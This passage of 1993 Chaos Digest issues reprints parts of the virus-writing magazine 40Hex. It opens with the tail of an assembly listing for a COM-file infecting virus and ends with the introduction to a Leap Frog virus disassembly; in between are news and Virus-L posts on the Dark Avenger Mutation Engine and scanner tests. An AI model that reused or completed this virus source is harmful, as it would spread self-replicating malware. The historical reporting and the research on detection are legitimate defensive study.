                mov     ax,word ptr [si+pspstore]
                mov     [di],ax
                add     si,2
                add     di,2
                loop    restorebytes
                pop     si
                ret

oldjmp          dw      0
filemask        db      '*.COM',0
idontknow1      db      66h                     ;Waste of one byte
buffer          db      00h, 00h, 01h           ;Waste of three bytes
storejmp        dw      0                       ;Waste of two bytes
;endvirus should be before idontknow1, thereby saving six bytes.
endvirus:
idontknow2      db      ?, ?
pspstore        db      200 dup (?)             ;Should actually be
idontknow3      db      2ch dup (?)             ;100h bytes long.
veryend:                                        ;End of encryption
muttiny         ends
                end     start

+++++

40Hex Number 7 Volume 2 Issue 3                                    File 005

    Well, by far the most incredible creation in the virus community that
has surfaced is the MtE.  We aren't going to go into details about it, but
we are definately going to give you as much news as we have collected.

In this file:

Article 1:   A note from Vesselin Bontchev
Article 2:   Steve Gibson tells us how to avoid polymorphic viruses
Article 3:   An article from Newsday about McAfee
Article 4:   NIST Expert Warns Feds to Find Better Ways to Head Off Viruses
Article 5:   Some messages posted on Smartnet about MtE


<<<<<<<<<<
Article 1:
<<<<<<<<<<

====From the Virus-L Digest via NIST=====
Date:    10 Feb 92 20:40:23 +0000
>From:    bontchev fbihh.informatik.uni-hamburg.de (Vesselin Bontchev)
Subject: Re: DAV/Sourcer/Rape (PC)

RUTSTEIN HWS.BITNET writes:

> First, has anyone heard about Dark Avenger's latest?  I got a report
> secondhand last week that he'd come up with a new gem...I believe the
> report came from a researcher in the UK.  Fridrik/Vesselin/others, can
> you confirm/deny this report?

Yeah, I can confirm it... :-( And it is a first-hand information,
since I have it. The long-rumored Mutating Engine is real and is
circulated to several virus exchange BBSes... :-(( The bad news is
that the damn thing really mutates, no kidding! It comes as an OBJ
file, which is supposed to be linked to any virus, with a detailed
do-it-yourself guide, and with a demo virus. The demo virus is in
source, but the source of the Mutating Engine (called MtE) is not
provided. According to the docs, what we have is version 0.90-beta of
the MtE, but version 0.91 is also known to exist... I'm wondering what
will be implemented more in version 1.00... :-(((

The damn thing is really difficult to crack! I mean, it contains no
encryption or anti-debugging and anti-disassembling thechniques, but
it mutates too well... I have observed changing of encryption
algorithms, random bytes padding, usage of different ways to express
one and the same algorithm (yeah, that's right - different ways, not
just modifying the opcodes and inserting do-nothing instructions)...
The currently most mutating virus (V2P6Z) is a toy compared to it...

The worst of all is that just anybody can sit and use it to create a
virus. Well, some experience in assembly language programming is
needed, so the kids from RABID, NukE, and the other punk virus writing
groups that use to write overwriting viruses in high-level languages
will have a little bit of trouble to learn how to use it... But a very
little bit!

Currently there are only two viruses, which use the MtE. The first is
the demo virus in the package (a silly, non-resident, COM file
infector, infects only the files in the current directory), and a
virus, called Pogue, which has been available on some VX BBSes in the
USA. McAfee's SCAN 86-B claims to be able to detect the Pogue virus.
Unfortunately, I haven't had the time to verify this (I recieved the
virus just two days ago). There are reports that in fact not all
possible variants of the virus are detected. SCAN 86-B DOES NOT detect
the MtE for sure - I tested it on the demo virus supplied with the
package.

As a conclusion, don't panic. Currently there are only two viruses,
using the MtE and both are too silly to pose a serious threat. Copies
of the MtE have been provided to several anti-virus researchers (no,
don't write me to ask for a copy, you won't get one), including McAfee
Associates, Fridrik Skulason, Dr. Solomon, etc., so there are a lot of
people working right now on the problem. The good news is that once we
learn to recognize the MtE, we'll be able to detect -any- new viruses
that are using it.

Oh, yes, just out of interest. The whole package comes in a neat ZIP
archive, with -AV code for "CrazySoft, Inc.". The Bulgarian hackers
have demonstrated again that the -AV authenticity verification in
PKZIP is just crap, so PLEASE DO NOT RELY ON IT!


<<<<<<<<<<
Article 2:
<<<<<<<<<<

>From InfoWorld Magazine
Tech Talk
by Steve Gibson

AT LAST, HOW TO PROTECT YOURSELF FROM POLYMORPHIC VIRUSES

  My past two columns concerning the threat presented by polymorphic
viruses triggered an informative conversation with the industry's
chief virus researcher, John McAfee. During that conversation I
learned that things are even worse than I'd supposed.

  It turns out that the "Dark Avenger" bulletin board system, which
disseminates virus code, has recently published source code for the
Dark Avenger Mutation Engine. The Mutation Engine is nothing less than
a first-class code kernel that can be tacked onto any existing or
future virus to turn it into a nearly impossible to detect
self-encrypting virus.

  My examination of a sample virus encrypted by the Mutation Engine
provided by McAfee revealed alarming capabilities. Not only do the
Dark Avenger Mutation Engine viruses employ all of the capabilities I
outlined in last week's column, but they also use a sophisticated
reversible encryption algorithm generator.

  The Mutation Engine uses a meta-language-driven algorithm generator
that allows it to create an infinite variety of completely original
encryption algorithms. The resulting unique algorithms are then salted
with superfluous instructions, resulting in decryption algorithms
varying from 5 to 200 bytes long.

  Because McAfee has already received many otherwise known viruses
that are now encapsulated with the Mutation Engine's polymorphic
encryption, it's clear that viruses of this new breed are now
traveling among us.

  It is clear that the game is forever changed; the sophistication of
the Mutation Engine is amazing and staggering. Simple pattern-matching
virus scanners will still reliably detect the several thousand
well-known viruses; however, these scanners are completely incapable
of detecting any of the growing number of viruses now being cloaked by
the Dark Avenger Mutation Engine.

  So what can we ultimately do to thwart current and future software
viruses? After brainstorming through the problem with some of our
industry's brightest developers and systems architects, I've reached
several conclusions.

  First, scanning for known viruses within executable program code is
fundamentally a dead end. It's the only solution we have for the
moment, but the detectors can only find the viruses they are aware of,
and new developments such as the Mutation Engine render even these
measures obsolete.

  Second, detecting the reproductive proclivities of viruses on the
prowl is prone to frequent false alarms and ultimately complete
avoidance. With time the viruses will simply circumvent the detectors,
at which time the detectors will only misfire for self-modifying
benign programs.

  Third, the Achilles' heel of our current DOS-based PC is its
entirely unprotected nature. As long as executable programs (such as
benign and helpful system utilities) are able to freely and directly
access and alter the operating system and its file system, our
machines will be vulnerable to deliberate attack.

  So here's my recommendation.

  Only a next-generation protected-mode operating system can enforce
the levels of security required to provide complete viral immunity. By
marking files and code overlays as "read and execute only" and by
prohibiting the sorts of direct file system tampering performed by our
current crop of system utilities, such operating systems will be able
to provide their client programs with complete viral immunity.

  The final Achilles' heel of a protected-mode operating system is the
system boot process, before and during which it is still potentially
vulnerable. By changing the system ROM BIOS' boot priority to favor
hard disk over floppy, this last viral path can be closed and blocked
as well.

(Steve Gibson is the developer and publisher of SpinRite and
president of Gibson Research Corp., based in Irvine California...)

------------------------------

End of Chaos Digest #1.60
************************************

Chaos Digest              Jeudi 24 Juin 1993        Volume 1 : Numero 61
                            ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.61 (24 Juin 1993)
File 1--40H VMag Number 7 Volume 2 Issue 3 #005(2) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 7 Volume 2 Issue 3 #005(2) (reprint)


<<<<<<<<<<
Article 3:
<<<<<<<<<<

Date:    Mon, 06 Apr 92 14:18:09 -0400
>From:    Joseph Halloran 
Subject: NY Newsday Article on McAfee & Viruses

     (NOTE: The following article was published as a whole in the
April 5, 1992 edition of New York Newsday, page 68.  It is reprinted
below without the express consent of Joshua Quittner, New York Newsday,
or the Times-Mirror Company)

                        SOFTWARE HARD SELL
                        ------------------
          "Are computer viruses running rampant, or is
           John McAfee's antivirus campaign running amok?"
                                 -By Joshua Quittner, staff writer

    John McAfee is doing one of the things he does best: warning a
reporter about the perils of a new computer virus.

    "We're into the next major nightmare -- the Dark Avenger Mutating
Engine," McAfee says, ever calm in the face of calamity.  "It can
attach to any virus and make it mutate."  The ability to "mutate"
makes it virtually undetectable to antivirus software, he explains.

    "It's turning the virus world upside down."

    But wait.  This is John David McAfee, the man who once ran a service
that revolved around the curious premise that, if you paid him a member-
ship fee and tested HIV-negative, you could have AIDS-free sex with other
members for six months.  This is the man who jumped from biological
viruses to computer viruses and quickly became a flamboyant expert on the
new demi-plague, showing up at the scene of infected PCs in his Winnebago
"antivirus paramedic unit."

     And this is the same man who started something called the Computer
Virus Industry Association, and, as chairman, made national headlines
last month by saying that as many as _five million_ computers might be
infected with a virus named Michelangelo.

     The virus turned out to be a dud, in the opinion of many industry
experts.  But not before McAfee became a media magnet: In the weeks be-
fore March 6, when Michelangelo was supposed to erase the hard disks of
infected IBM and compatible PCs, he was featured by Reuters, the
Associated Press, USA Today, the Wall Street Journal, "MacNeil/Lehrer
News Hour," CNN, "Nightline," National Public Radio and "Today."

     What some news reports failed to point out, however, is that McAfee
is also the man who runs Santa Clara, Calif.-based McAfee Associates,
a leading manufacturer of antivirus software, and that he stood to
benefit from publicity about Michelangelo.  McAfee won't reveal sales,
but it seems clear they shot up during the two-week frenzy.

     "People kept saying I hyped this, I hyped this," said McAfee, who
still defends the notion that Michelangelo was widespread.  "I never
contacted the press -- they called me."

     McAfee's detractors say the Michelangelo scare was mainly hype and
media manipulation, a parade in which most of the floats were built by
McAfee.  They say McAfee helped drive the rush to buy antivirus soft-
ware -- with his products poised to sell the most -- while boosting the
profile of McAfee Associates, a company that recently received
$10 million from venture capitalists McAfee says are waiting to sell
stock publicly.

     And, critics say, while McAfee touts a recent evaluation that rated
his software alone as 100 percent effective in finding virtually every
known virus, he funded the evaluation and picked his competitors.

     "He does know the issue of viruses, no doubt about it," said Ken
Wasch, executive director of the 900-member Software Publishers Assoc-
iation.  "But his tactics are designed to sell _his_ software."

     McAfee says the media consistently misquoted him about how
widespread Michelangelo was.  And his company didn't profit from the
virus, he says, but actually suffered due to the free advice his staff
was dispensing.  "It does not benefit me in any way or shape or form
to exaggerate the virus problem."

    Even McAfee's detractors admit his programs do what they're supposed
to do: track down coding that's maliciously placed in software to make it
do anything from whistle "Yankee Doodle" to erase valuable data.

    His strongest distribution channel is shareware, a kind of software
honor system common on electronic bulletin boards.  PC users can download
the programs over phone lines and pay later if they find them useful.

    McAfee's programs are "probably the most popular shareware programs
of all time, second only to PKZIP," which compresses data, said George
Pulido, technical editor of Shareware Magazine.  He said McAfee's
programs have been copied by millions of people, although only about 10
percent of shareware users actually pay.

    A more reliable money-maker is corporate site licenses, where McAfee
is one of the three biggest players.  Michael Schirf, sales manager of
Jetic Inc., a Vienna, Va., company that is McAfee's sales agent for the
Mid-Atlantic region, claimed more than 300 of the Fortune 500 companies
have licensed his software, paying $3,250 to $20,000, depending on the
number of PCs.  During the Michelangelo scare, "you couldn't get through
to us at one point because of people asking about it and trying to get
it," Schirf said.

    Certainly, McAfee's software wasn't the only antivirus software
selling.  Fueled by giveaways of "special edition" programs that scanned
exclusively for the Michelangelo virus, sales of general antivirus
packages were a bonanza for everyone in the business, including Norton/
Symantec and Central Point Software, two other leading sellers.

    "Our sales of antivirus software were up 3,000 percent," said Tamese
Gribble, a spokesman for Egghead Software, the largest discount software
retailer in the country.  "We were absolutely swamped."

    Rod Turner, a Norton executive vice president, said antivirus sales
increased fivefold.  "We didn't make any product in advance," he said,
"so we were caught with our pants down."  Companies like Norton that
sell factory-shipped software couldn't ramp up quickly enough to take
full advantage of the situation.  But McAfee's software comes mostly
through electronic bulletin boards and sales agents, giving him a nearly
limitless capability to meet demand.  "I can supply as many copies of the
software as I have blank diskettes to put it on," Schirf said.

    The Michelangelo scare was also good for pay-by-the-hour on-line
information services such as Compuserve, which saw a huge increase in the
time users logged on looking for advice on Michelangelo.

    Indeed, a virus forum on Compuserve was hugely popular, with users
downloading antivirus programs, including McAfee's, 49,000 times that
week, Compuserve spokesman Dave Kishler said.  Compuserve made more than
$100,000 from the online time.

    McAfee makes an attractive industry spokesman.  Tall and lean, with a
mellifluous voice, he speaks in perfect sound bites -- an antidote to the
unquotably bland men who otherwise dominate the antivirus business.

    A mathematician who got into programming when he graduated from
Roanoke College, McAfee, 47, said he has held a dozen jobs, ranging from
work on a voice-recognition board for PCs to consulting for the Brazilian
national phone company in Rio de Janeiro.  His first mention in the media
was in connection with the American Association for Safe Sex Practices, a
Santa Clara club formed so that its members could engage in AIDS-free
sex.  For a $22 fee, members whose blood tested HIV-negative were given
cards certifying them AIDS-free, buttons saying "Play it Safe," and were
entered on McAfee's on-line data base.  Updates, every six months, cost $7.

    Anyone who knows anything about AIDS knows a certificate that someone
is AIDS-free is good only until the person has sex with or shares an
intravenous needle with an infected person.

    When asked now about the safe-sex group, McAfee at first denied
anything but a passing affiliation: "I worked for those people as a con-
tractor," he said, adding, "It was not my company."  But later, when he
was reminded that both the San Diego Tribune and the San Francisco
Chronicle described him in feature stories as the entrepreneur who
started the organization ("I believe I am providing an environment
where people who are sexually active can feel more safe and secure,"
he told the Tribune in a March 9, 1987, story), McAfee sidestepped the
ownership question.  He said the group performed a valuable function,
maintaining a data base on AIDS and information about the disease.

    "I thought they were pretty well ahead of their time," he said,
quickly locating a 1987 newsletter put out by the group, which featured
articles such as "Kissing and AIDS" and "The Apparent Racial Bias of the
AIDS Virus."

    The association no longer exists.  "They came and went pretty fast,"
McAfee said, chuckling.

    McAfee got his first taste of computer viruses at around that time.
"It was an accident, like anything else in life," he recalled.  "I got
a copy of the Pakistani Brain.  I think I got it from one of the local
colleges.  It was the program of the year."  The program, reportedly
written by two Pakistani students trying to foil software pirates,
destroyed some PC data.

    By 1989, McAfee was a virus expert, selling the first antivirus
software and offering to make house calls with his Winnebago cum computer
lab.

    "John's antivirus unit is the first specially customized unit to wage
effective, on-the-spot counterattacks in the virus war," McAfee and a
co-author reported in "Computer Viruses, Worms, Data Diddlers, Killer
Programs, and Other Threats to Your System," their 1989 book.  "Event-
ually, there will be many such mobile search, capture and destroy anti-
virus paramedic units deployed around the world."

    He had also founded the Computer Virus Industry Association, with
himself as chairman.

    "The CVIA is nothing more than McAfee," said Wasch, of the Software
Publishers Association.  "I had a run-in with him three years ago about
that."  Wasch said he had been asked by other antivirus businesses to
look into McAfee's group after claims surfaced that he was railroading
companies into joining -- something McAfee vigorously denies.  Wasch
said he believes the assocation was a self-serving group that did
little more than support McAfee's business.

    "It would be like Microsoft creating the Windows Support Association
as a front to promote its Windows software," Wasch said.

    McAfee denies the CVIA is a front and said Wasch's group was
threatened by the creation of the virus association.  "They wanted to
take us over," he said.  In any event, he said, the association is now
managed by others and his involvement is minimal, adding, "It's more of
a nuisance to me."  But he does say the association is dependent on his
private business for much of its virus data.  "McAfee Associates has all
the numbers," he said.

    Detractors say McAfee now uses another association to hype his
programs.

    The National Computer Security Association released one of the few
ratings of antivirus software, with McAfee's program on top -- a
comparison he's quick to cite.  But that may be because he influenced
which software would be compared with his and how the tests were run,
said David Stang, who founded the for-profit association in Washington,
D.C., two years ago.  Stang recently left the association and started
a new one after a falling-out with McAfee over testing procedures.

    Stang said one of the assocation's functions was to "certify"
antivirus software -- to test and rate competing programs.  "It was his
[McAfee's] idea that we certify products," Stang said.  And when no
company rushed forward to pay $500 to have its software rated, McAfee
"sent me the products and the check and said 'go certify.'"

    McAfee says he spent thousands of dollars to evaluate some of his
competitors' programs.  In February, 1992, in fact, he paid for his own
and the other five programs to be certified.  His was ranked 100 percent
effective.  The others ranged from 44 percent to 88 percent effective.

    "If your product competes with mine, I'd like for those customers of
mine to know that your product isn't as good as mine," he said.  But in
the February certification, notably absent were McAfee's biggest
competitors: Dr. Solomon's ToolKit and Skulason's F-Prot.

    "I've got 75 competitors.  I pick the ones who are going to give me
the most trouble that month," McAfee explained.

    The February evaluation was actually a second, and more favorable
test, that Stang says he performed at McAfee's request.  Stang said
McAfee was dissatisfied with the assocation's methods -- it tested the
software against a "library" of viruses that McAfee thought wasn't
comprehensive enough.  So Stang said he agreed to use a new library that
he claims was built on viruses McAfee found and supplied.  Scores for
McAfee's program rose while some others dropped sharply.  McAfee said
Stang's virus library was incomplete and his testing methods "wishy-
washy," and he defended the new library's independence.

    "This is not something that anybody, let alone me, could mess with,"
said McAfee.  "You can't jimmy these scores.  You can't say that McAfee
buys more certifications, therefore he'll get a better score, because
other vendors would complain."

    "They wouldn't let me get away with it."

[John McAfee]

<<<<<<<<<<
Article 4:
<<<<<<<<<<

From: Government Computer News
      March 30, 1992
By:   Kevin Power, GCN staff

"NIST Expert Warns Feds to Find Better Ways to Head Off Viruses"

BALTIMORE - In the wake of the Michelangelo scare, a top security
expert with the National Institute of Standards and Technology has
warned agencies against relying too heavily on virus scanning
software.

  Anti-virus software ia a useful detection tool, but it often takes
too long to use and does not solve fundamental problems, said Dennis
Steinhauer, manager of the computer security evaluation group at
NIST's Computer Systems Laboratory. He spoke at the March meeting of
the National Computer System Security and Privacy Advisory Board.

  Steinauer said the fallout from Michelangelo was minimal, thanks to
early detection, plenty of publicity and governmentwide [sic]
warnings. But he also stressed that vendors and agencies need more
effective methods of protecting against viruses in newly acquired
hardware and software.

  "What were believed to be reliable channels may no longer be," he
said. "There's a lot that needs to be done to make sure that users
receive better assurances that products are not contaminated. This
incident may have undermined consumer confidence."

  Steinhauer said one solution would be to build hardware and
operating systems that are less vulnerable.

  For example, vendors can isolate the boot sector of a hard drive to
guard against infection. But agencies tend to shy away from such
serious measures, because they force managers make hard choices about
system functionality and user requirements, Steinhauer said.

  "We have the technology to do what is necessary. But we don't know
what the price is to the user," he said. "The question is whether I'm
willing to have my machine hobbled for protection. It's similar to
installing a governor on a car to limit a vehicle's speed to 55 miles
per hour."

   Agencies still are surveying for possible damage inflicted by
Michelangelo, Steinhauer said. But he said the incident showed NIST
officials that more agency computer emergency response teams (CERTs)
are needed.

  CERTs, established in some agencies for just such attacks, worked
well, Steinhauer said. The teams coordinate their work through the
Forum on Incident Response and Security Teams, or FIRST.

  But Steinhauer said it was evident that not enough agencies have
established CERTs.

  Internal agency security teams did their jobs, but the government
needs a better way to distribute security advisories and handle
less-publicized emergencies, Steinhauer said.


<<<<<<<<<<<
Article 5A:
<<<<<<<<<<<

Date: 05-29-92 (21:06)              Number: 3019 of 3059 (Echo)
  To: BILL LAMBDIN                  Refer#: NONE
From: CHARLIE MOORE                   Read: NO
Subj: POLYMORPHIC VIRUSES   1/2     Status: PUBLIC MESSAGE
Conf: VIRUS (52)                 Read Type: GENERAL (+)

Note: This message is a repost -- I tied up the first by failing
      to set the lines per message < 99.  My apologies to all.

Bill, regarding how McAfee's Scan detects the DAME you stated:

BL>Trust me. It is still string searches. McAfee finds those three
BL>bytes, and then follows the steps to decrypt the virus to memory. If
BL>it continues long enough to possitively identify the DAME, Scan
BL>reports the virus, and looks at the next

Now, being in the security business, and probably a bit paranoid as a
result, when I see or hear "Trust me", I get a little queezy. I don't
know the source of your information Bill (perhaps you'll let us know)
but I don't think it's correct.

On May 11, 1992, McAfee Associates was featured in a news release about
the DAME -- Dark Avenger Mutation Engine No Threat to Protected PCs.
Below is a quote from this release that does not track with what you're
telling me (BTW, it was McAfee Associates who sent me the news
release -- did not see it until today though).

     The Mutation Engine, however, uses a special algorithm to
     generate a completely variable decryption routine each time.
     "The result is that no three bytes remain constant from one
     sample to the next," said Igor Grebert, senior programmer at
     McAfee Associates.  "This makes detection using conventional
     string-matching techniques impossible."

Now, in my last message to you I stated that I understood three bytes
did remain constant (I got this info from two sources; Hoffman's Vsum204
and tech support at Fifth Generation Systems -- I now suspect Hofman is
wrong and tech support at Fifth Generation Systems was probably just
parroting Hoffman's Vsum.  As I've stated before, solid technical
information about the DAME is limited!

Today, I called Igor Grebert at McAfee Associates to verify that he was
properly quoted in the news release -- he was.  Igor would not tell me
in detail how McAfee's Scan detects the DAME; however, he did assure me
that searching for a three-byte string was not the technique used.

BL>CM> I don't think anyone, not even the Dark Avenger himself, can put an
BL>CM> accurate number on the possible virus mutations generated by the

BL>Again trust me. It is mathmatics pure and simple.

BL>the DAME randomly picks a 32 bit seed. Each bit will either be a 1 or 0.
BL>... according to my scientific calculator, or 4.3 billion possible
BL>combinations in english.
BL>If the numbers above ring bells, it is binary plain and simple.

Well Bill, I'm certainly not going to argue with your calculator. :-)

However, my point was, and remains, that the possible numbers associated
with a random seed are not necessarily equal to the possible number of
mutations the DAME is capable of generating.  Now, as I stated to you
in my original message, solid information on the DAME (in particular,
how it works interactively with its various segments of code) is
limited.  Even the most experienced and best qualified researchers
often don't agree on certain aspects and more than a few questions
remain about the limits of variability and related issues.

Below is the latest and best info I've seen that gives some insight
into the complexity here.  The message was posted on the Internet's
Virus-L Conference; its author, Vesselin Bontchev, is one of the
most highly respected virus researchers in the world.

Date:    21 May 92 22:11:43 +0000
From:  bontchev@fbihh.informatik.uni-hamburg.de (Vesselin Bontchev)
Subject:  Detecting the MtE (PC)

Almost half an year has passed since the Dark Avenger's Mutating
Engine (MtE) has been made available to the anti-virus researchers.
Currently several scanners claim to detect it with "100 %
reliability". Do they really succeed however?

We decided to run some tests at the VTC. The tests are preliminary and
were performed by Morton Swimmer. The Fear virus was used (a minor
Dedicated patch) to generate 9,471 infected files. The files were
generated by the natural infection process - the reason was to also test
the randomness of the random number generator supplied with the MtE. Of
those 9,471 infected examples 3 turned out to be duplicates, which
yelded to 9,468 different instances of the virus. It also means that the
random number generator is rather good...

Those examples filled a 40 Mb disk (which didn't permit us to generate
10,000 different examples, as we wished initially). We wanted to keep
them all, in order to be able to reproduce the tests.

The three scanners were run on those virus samples. The scanners were
the three that showed best detection rate on our collection, merely
Dr. Solomon's FindVirus (version 4.15 with drivers from May 15, 1992),
Fridrik Skulason's F-Prot 2.03a, and McAfee's SCAN 89-B.

All the three scanners failed the test, each in a different way.

FindVirus showed the worst results. It did not detect 744 virus
samples (7.86 %). F-Prot did not detect 13 examples (0.14 %). SCAN did
not detect 4 examples (0.04 %). SCAN shows the best detection rate in
the case of MtE, but we also got a report for one false positive.
For the average users the above rates might appear to be high enough.
What are 4 undetected infected files when almost 10,000 infected ones
have been properly detected? Well, it does matter. When you are
looking for a particular known virus, anything below 100 % detection
means that your program fails to detect it reliably. Rmember that a
single not detected file may re-start the epidemy.

There is another thing to be concerned about. The MtE uses a 128-byte
random number generator, which means that theoretically it can exist
in 2^512 different variants. And 0.04 % of this is still quite a

CM>   [Hmm...  yet a different number of possible mutations?]

lot... Suppose that some virus writer runs the same tests (or even
more elaborate ones) and determines for which values of the random
number generator the virus is not detected. Then he can create a new
random number generator (the MtE provides the possibility for
user-supplied random number generators to be plugged in), which
generates -only- those values... Such a virus will not vary a lot, but
it will still mutate and -all- its mutations will escape that
particular scanner...

 As I mentioned in the beginning, those were only preliminary tests. We
intend to modify the random number generator so that it will generate
consecutive (instead of random) numbers and to create a few hundreds
thousands mutations by keeping only those which a particular scanner
does NOT detect. We'll then re-run the tests for random ranges of
consecutive mutations. All we can say now is that neither of the three
scanners mentioned above is able to detect MtE-based viruses with 100
% reliability.

Currently I am aware of the existence of at least three other scanners
which claim 100 % detection of the MtE. One comes with the new version
of V-Analyst III, the second has been designed by IBM, and the third
is Dutch scanner. As soon as we get them we'll re-run the tests.

Regards,
Vesselin
----------------------End of Vesselin's Message----------------------

Bill, I'll follow up on the subsequent tests Vesselin intends to run and
report the results to you.

One thing I've learned in this business is that accurate and solid
information is sometimes hard to come by and the experts don't always
have all the answers.  Although I think Vesselin's above message is
pretty solid, I also think he fails to consider something:  on the one
hand, he states a theoretical 2^512 (in contrast, your number is 2^32)
different variants; yet, his empirical data produces 3 duplicate
mutations from a run of less than 10 thousand.  I think this is rather
odd from a statistical perspective.

Regards,
   Charlie Moore

<<<<<<<<<<<
Article 5B:
<<<<<<<<<<<

Date: 05-30-92 (15:08)              Number: 3021 of 3059 (Echo)
  To: BILL LAMBDIN                  Refer#: NONE
From: CHARLIE MOORE                   Read: NO
Subj: POLYMORPHIC VIRUSES           Status: PUBLIC MESSAGE
Conf: VIRUS (52)                 Read Type: GENERAL (+)

Bill, here's a followup post from Vesselin regarding the DAME:

-----------------Extracted from Internet's Virus-L--------------------

Date:    27 May 92 08:44:06 +0000
From:    bontchev@fbihh.informatik.uni-hamburg.de (Vesselin Bontchev)
Subject: Re: Detecting the MtE (PC)

bontchev@fbihh.informatik.uni-hamburg.de (Vesselin Bontchev) writes:

> MtE. Of those 9,471 infected examples 3 turned out to be duplicates,
> which yelded to 9,468 different instances of the virus. It also means

Correction: a fourth duplicate has been found later. Therefore the
total number of generated different mutations used during the test is
only 9,467.

> Currently I am aware of the existence of at least three other scanners
> which claim 100 % detection of the MtE. One comes with the new version
> of V-Analyst III, the second has been designed by IBM, and the third
> is Dutch scanner. As soon as we get them we'll re-run the tests.

We tried out the Dutch scanner. Its authors were present during the
test. When they saw the results, they decided that the program is not
ready to be tested yet and promised to send us a fixed version soon... :-)

We just received the V-Analyst III scanner; we haven't tested it yet.
As soon as the test is performed, I'll post the results.

Meanwhile we received and tested yet another scanner which claims "100%
detection of the MtE-based viruses". It is a German product, called
AntiVir IV and produced by H+BEDV. The version tested was 4.03 of May
15, 1992, beta version. It missed 584 mutations (6.17 %).

Regards,
Vesselin
- --
Vesselin Vladimirov Bontchev         Virus Test Center, University of Hamburg
Tel.:+49-40-54715-224, Fax: +49-40-54715-226     Fachbereich Informatik - AGN
** PGP public key available by finger. **   Vogt-Koelln-Strasse 30, rm. 107 C
e-mail: bontchev@fbihh.informatik.uni-hamburg.de   D-2000 Hamburg 54, Germany

------------------------------

End of Chaos Digest #1.61
************************************

Chaos Digest              Vendredi 25 Juin 1993        Volume 1 : Numero 62
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.62 (25 Juin 1993)
File 1--40H VMag Number 7 Volume 2 Issue 3 #006-008(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 7 Volume 2 Issue 3 #006-008(1) (reprint)


40Hex Number 7 Volume 2 Issue 3                                     File 006

                         Virus Spotlite on: Leap Frog

It's always interesting to find new residency techniques.  I suppose everyone
by now is tired of the traditional high-memory loading routine and is on the
lookout for something different.  40Hex comes to the rescue!

This virus, the "Leap Frog" or USSR 516, has one of the most unique methods
I have ever seen.  I was mucking around in VSUM and noticed that it, according
to Patricia, it "installs itself in a hole in memory between MSDOS and the DOS
Stacks."  She is, of course, not telling us the entire story.  Leap Frog
basically latches onto and resides in a DOS disk buffer.  I do not know who
the author is, but I commend him for his innovative technique.  I took the
liberty of disassembling the virus which is given below.  It should be an
exact byte-for-byte matchup of the original carrier file (or at least should
